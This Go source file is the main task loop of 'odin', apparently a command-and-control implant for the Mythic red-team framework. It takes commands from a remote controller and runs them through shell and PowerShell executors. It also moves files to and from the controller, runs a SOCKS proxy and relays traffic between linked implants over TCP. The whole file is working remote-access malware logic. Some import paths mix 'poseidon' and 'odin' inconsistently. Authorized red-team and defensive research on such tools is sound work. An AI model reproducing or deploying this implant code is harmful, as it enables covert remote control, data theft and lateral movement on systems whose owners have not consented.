package main

import (
	"C"

	// Standard
	"encoding/json"
	"fmt"
	"net"
	"sort"
	"sync"

	// Odin
	"github.com/MythicAgents/odin/Payload_Type/odin/agent_code/bash_executor"
	"github.com/MythicAgents/odin/Payload_Type/odin/agent_code/cmd_executor"
	"github.com/MythicAgents/odin/Payload_Type/odin/agent_code/download"
	"github.com/MythicAgents/odin/Payload_Type/odin/agent_code/powershell_executor"
	"github.com/MythicAgents/odin/Payload_Type/odin/agent_code/sh_executor"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/socks"
	"github.com/MythicAgents/odin/Payload_Type/odin/agent_code/upload"
	"github.com/MythicAgents/odin/Payload_Type/odin/agent_code/zsh_executor"
	"github.com/MythicAgents/odin/Payload_Type/odin/agent_code/pkg/profiles"
  "github.com/MythicAgents/odin/Payload_Type/odin/agent_code/pkg/utils/structs"

)
import (
	"encoding/binary"
	"os"

	"github.com/MythicAgents/poseidon/Payload_Type/odin/agent_code/link_tcp"
	"github.com/MythicAgents/poseidon/Payload_Type/odin/agent_code/sleep"
	"github.com/MythicAgents/poseidon/Payload_Type/odin/agent_code/unlink_tcp"
)

const (
	NONE_CODE = 100
	EXIT_CODE = 0
)

// list of currently running tasks
var runningTasks = make(map[string](structs.Task))
var mu sync.Mutex

// channel processes new tasking for this agent
var newTaskChannel = make(chan structs.Task, 10)

// channel processes responses that should go out and directs them towards the egress direction
var newResponseChannel = make(chan structs.Response, 10)
var newDelegatesToMythicChannel = make(chan structs.DelegateMessage, 10)
var P2PConnectionMessageChannel = make(chan structs.P2PConnectionMessage, 10)

// Mapping of command names to integers
var tasktypes = map[string]int{
	"exit":              EXIT_CODE,
	"bash_executor":     1,
  "cmd_executor":      2,
	"download":          3,
	"jobs":              4,
	"jobkill":           5,
  "powershell_executor": 6,
	"socks":             7,
	"sh_executor":       8,
	"upload":            9,
  "zsh_executor":      10,
	"sleep":             11,
	"link_tcp":          12,
	"unlink_tcp":        13,
	"none":              NONE_CODE,
}

// define a new instance of an egress profile and P2P profile
var profile = profiles.New()

// Map used to handle go routines that are waiting for a response from apfell to continue
var storedFiles = make(map[string]([]byte))

var sendFilesToMythicChannel = make(chan structs.SendFileToMythicStruct, 10)
var getFilesFromMythicChannel = make(chan structs.GetFileFromMythicStruct, 10)

//export RunMain
func RunMain() {
	main()
}

// go routine that listens for messages that should go to Mythic for sending files to Mythic
// get things ready to transfer a file from odin -> Mythic
func sendFileToMythic() {
	for {
		select {
		case fileToMythic := <-sendFilesToMythicChannel:
			fileToMythic.TrackingUUID = profiles.GenerateSessionID()
			fileToMythic.FileTransferResponse = make(chan json.RawMessage)
			fileToMythic.Task.Job.FileTransfers[fileToMythic.TrackingUUID] = fileToMythic.FileTransferResponse
			go profiles.SendFile(fileToMythic)
		}
	}
}

// go routine that listens for messages that should go to Mythic for getting files from Mythic
// get things ready to transfer a file from Mythic -> odin
func getFileFromMythic() {
	for {
		select {
		case getFile := <-getFilesFromMythicChannel:
			getFile.TrackingUUID = profiles.GenerateSessionID()
			getFile.FileTransferResponse = make(chan json.RawMessage)
			getFile.Task.Job.FileTransfers[getFile.TrackingUUID] = getFile.FileTransferResponse
			go profiles.GetFile(getFile)
		}
	}
}

// save a file to memory for easy access later
func saveFile(fileUUID string, data []byte) {
	storedFiles[fileUUID] = data
}

// remove saved file from memory
func removeSavedFile(fileUUID string) {
	delete(storedFiles, fileUUID)
}

// get a saved file from memory
func getSavedFile(fileUUID string) []byte {
	if data, ok := storedFiles[fileUUID]; ok {
		return data
	} else {
		return nil
	}
}

func handleInboundMythicMessageFromEgressP2PChannel() {
	for {
		//fmt.Printf("looping to see if there's messages in the profiles.HandleInboundMythicMessageFromEgressP2PChannel\n")
		select {
		case message := <-profiles.HandleInboundMythicMessageFromEgressP2PChannel:
			//fmt.Printf("Got message from HandleInboundMythicMessageFromEgressP2PChannel\n")
			go handleMythicMessageResponse(message)
		}
	}
}

// Handle responses from mythic from post_response
func handleMythicMessageResponse(mythicMessage structs.MythicMessageResponse) {
	// Handle the response from apfell
	//fmt.Printf("handleMythicMessageResponse:\n%v\n", mythicMessage)
	// loop through each response and check to see if the file_id or task_id matches any existing background tasks
	for i := 0; i < len(mythicMessage.Responses); i++ {
		var r map[string]interface{}
		err := json.Unmarshal([]byte(mythicMessage.Responses[i]), &r)
		if err != nil {
			//log.Printf("Error unmarshal response to task response: %s", err.Error())
			break
		}

		//log.Printf("Handling response from apfell: %+v\n", r)
		if taskid, ok := r["task_id"]; ok {
			if task, exists := runningTasks[taskid.(string)]; exists {
				// send data to the channel
				if exists {
					raw, _ := json.Marshal(r)
					if trackingUUID, ok := r["tracking_uuid"]; ok {
						if fileTransfer, exists := task.Job.FileTransfers[trackingUUID.(string)]; exists {
							go func() {
								fileTransfer <- raw
							}()
							continue
						}
					}
					go func() {
						task.Job.ReceiveResponses <- raw
					}()
					continue
				}
			}
		}
	}
	// loop through each socks message and send it off
	for j := 0; j < len(mythicMessage.Socks); j++ {
		profiles.FromMythicSocksChannel <- mythicMessage.Socks[j]
	}
	// sort the Tasks
	sort.Slice(mythicMessage.Tasks, func(i, j int) bool {
		return mythicMessage.Tasks[i].Timestamp < mythicMessage.Tasks[j].Timestamp
	})
	// for each task, give it the appropriate Job information and send it on its way for processing
	for j := 0; j < len(mythicMessage.Tasks); j++ {
		job := &structs.Job{
			Stop:                               new(int),
			ReceiveResponses:                   make(chan json.RawMessage, 10),
			SendResponses:                      newResponseChannel,
			SendFileToMythic:                   sendFilesToMythicChannel,
			FileTransfers:                      make(map[string](chan json.RawMessage)),
			GetFileFromMythic:                  getFilesFromMythicChannel,
			SaveFileFunc:                       saveFile,
			RemoveSavedFile:                    removeSavedFile,
			GetSavedFile:                       getSavedFile,
			AddNewInternalTCPConnectionChannel: profiles.AddNewInternalTCPConnectionChannel,
			RemoveInternalTCPConnectionChannel: profiles.RemoveInternalTCPConnectionChannel,
			C2:                                 profile,
		}
		mythicMessage.Tasks[j].Job = job
		runningTasks[mythicMessage.Tasks[j].TaskID] = mythicMessage.Tasks[j]
		newTaskChannel <- mythicMessage.Tasks[j]
	}
	// loop through each delegate and try to forward it along
	if len(mythicMessage.Delegates) > 0 {
		profiles.HandleDelegateMessageForInternalTCPConnections(mythicMessage.Delegates)
	}
	return
}

// gather the responses from the task go routines into a central location
func aggregateResponses() {
	for {
		select {
		case response := <-newResponseChannel:
			marshalledResponse, err := json.Marshal(response)
			if err != nil {

			} else {
				if response.Completed {
					// We need to remove this job from our list of jobs
					delete(runningTasks, response.TaskID)
				}
				mu.Lock()
				profiles.TaskResponses = append(profiles.TaskResponses, marshalledResponse)
				mu.Unlock()
			}

		}
	}
}

// gather the delegate messages that need to go out the egress channel into a central location
func aggregateDelegateMessagesToMythic() {
	for {
		select {
		case response := <-newDelegatesToMythicChannel:
			mu.Lock()
			profiles.DelegateResponses = append(profiles.DelegateResponses, response)
			mu.Unlock()
		}
	}
}

// gather the edge notifications that need to go out the egress channel
func aggregateEdgeAnnouncementsToMythic() {
	for {
		select {
		case response := <-P2PConnectionMessageChannel:
			mu.Lock()
			profiles.P2PConnectionMessages = append(profiles.P2PConnectionMessages, response)
			mu.Unlock()
		}
	}
}

// process new tasking and call their go routines
func handleNewTask() {
	for {
		select {
		case task := <-newTaskChannel:
			//fmt.Printf("Handling new task: %v\n", task)
			switch tasktypes[task.Command] {
			case EXIT_CODE:
				os.Exit(0)
				break
			case 1:
				go bash_executor.Run(task)
				break
			case 2:
				go cmd_executor.Run(task)
				break
			case 3:
				go download.Run(task)
				break
			case 4:
				// Return the list of jobs.
				go getJobListing(task)
				break
			case 5:
				// Kill the job
				go killJob(task)
				break
			case 6:
				go powershell_executor.Run(task)
				break
			case 7:
				go socks.Run(task)
				break
			case 8:
				go sh_executor.Run(task)
				break
			case 9:
				go upload.Run(task)
				break
			case 10:
				go zsh_executor.Run(task)
				break
			case 11:
				// Sleep
				go sleep.Run(task)
				break
			case 12:
				go link_tcp.Run(task)
				break
			case 13:
				go unlink_tcp.Run(task)
				break
			case NONE_CODE:
				// No tasks, do nothing
				break
			}
			break
		}
	}
}

func getJobListing(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	msg.Completed = true
	// For graceful error handling server-side when zero jobs are processing.
	if len(runningTasks) == 0 {

		msg.UserOutput = "0 jobs"
	} else {
		var jobList []structs.TaskStub
		for _, x := range runningTasks {
			jobList = append(jobList, x.ToStub())
		}
		jsonSlices, err := json.MarshalIndent(jobList, "", "	")
		if err != nil {
			msg.UserOutput = err.Error()
			msg.Status = "error"
		} else {
			msg.UserOutput = string(jsonSlices)
		}

	}
	task.Job.SendResponses <- msg
}

func killJob(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID

	foundTask := false
	for _, taskItem := range runningTasks {
		if taskItem.TaskID == task.Params {
			*taskItem.Job.Stop = 1
			foundTask = true
			break
		}
	}

	if foundTask {
		msg.UserOutput = fmt.Sprintf("Sent kill signal to Job ID: %s", task.Params)
		msg.Completed = true
	} else {
		msg.UserOutput = fmt.Sprintf("No job with ID: %s", task.Params)
		msg.Completed = true
	}
	task.Job.SendResponses <- msg
}

// Tasks send a new net.Conn object to the task.Job.AddNewInternalConnectionChannel for odin to track
func handleAddNewInternalTCPConnections() {
	for {
		select {
		case newConnection := <-profiles.AddNewInternalTCPConnectionChannel:
			//fmt.Printf("handleNewInternalTCPConnections message from channel for %v\n", newConnection)
			newUUID := profiles.AddNewInternalTCPConnection(newConnection)
			go readFromInternalTCPConnections(newConnection, newUUID)
		}
	}
}

func readFromInternalTCPConnections(newConnection net.Conn, tempConnectionUUID string) {
	// read from the internal connections to pass back out to Mythic
	//fmt.Printf("readFromInternalTCPConnection started for %v\n", newConnection)
	var sizeBuffer uint32
	for {
		err := binary.Read(newConnection, binary.BigEndian, &sizeBuffer)
		if err != nil {
			fmt.Println("Failed to read size from tcp connection:", err)
			profiles.RemoveInternalTCPConnectionChannel <- tempConnectionUUID
			return
		}
		if sizeBuffer > 0 {
			readBuffer := make([]byte, sizeBuffer)

			readSoFar, err := newConnection.Read(readBuffer)
			if err != nil {
				fmt.Println("Failed to read bytes from tcp connection:", err)
				profiles.RemoveInternalTCPConnectionChannel <- tempConnectionUUID
				return
			}
			totalRead := uint32(readSoFar)
			for totalRead < sizeBuffer {
				// we didn't read the full size of the message yet, read more
				nextBuffer := make([]byte, sizeBuffer-totalRead)
				readSoFar, err = newConnection.Read(nextBuffer)
				if err != nil {
					fmt.Println("Failed to read bytes from tcp connection:", err)
					profiles.RemoveInternalTCPConnectionChannel <- tempConnectionUUID
					return
				}
				copy(readBuffer[totalRead:], nextBuffer)
				totalRead = totalRead + uint32(readSoFar)
			}
			//fmt.Printf("Read %d bytes from connection\n", totalRead)
			newDelegateMessage := structs.DelegateMessage{}
			newDelegateMessage.Message = string(readBuffer)
			newDelegateMessage.UUID = profiles.GetInternalConnectionUUID(tempConnectionUUID)
			newDelegateMessage.C2ProfileName = "odin_tcp"
			//fmt.Printf("Adding delegate message to channel: %v\n", newDelegateMessage)
			newDelegatesToMythicChannel <- newDelegateMessage
		} else {
			//fmt.Print("Read 0 bytes from internal TCP connection\n")
			profiles.RemoveInternalTCPConnectionChannel <- tempConnectionUUID
		}

	}

}

func handleRemoveInternalTCPConnections() {
	for {
		select {
		case removeConnection := <-profiles.RemoveInternalTCPConnectionChannel:
			//fmt.Printf("handleRemoveInternalTCPConnections message from channel for %v\n", removeConnection)
			successfullyRemovedConnection := false
			removalMessage := structs.P2PConnectionMessage{Action: "remove", C2ProfileName: "odin_tcp", Destination: removeConnection, Source: profiles.GetMythicID()}
			successfullyRemovedConnection = profiles.RemoveInternalTCPConnection(removeConnection)
			if successfullyRemovedConnection {
				P2PConnectionMessageChannel <- removalMessage
			}
		}
	}
}

func main() {
	// Initialize the  agent and check in
	go aggregateResponses()
	go aggregateDelegateMessagesToMythic()
	go aggregateEdgeAnnouncementsToMythic()
	go handleNewTask()
	go sendFileToMythic()
	go getFileFromMythic()
	go handleAddNewInternalTCPConnections()
	go handleRemoveInternalTCPConnections()
	go handleInboundMythicMessageFromEgressP2PChannel()
	profile.Start()
}
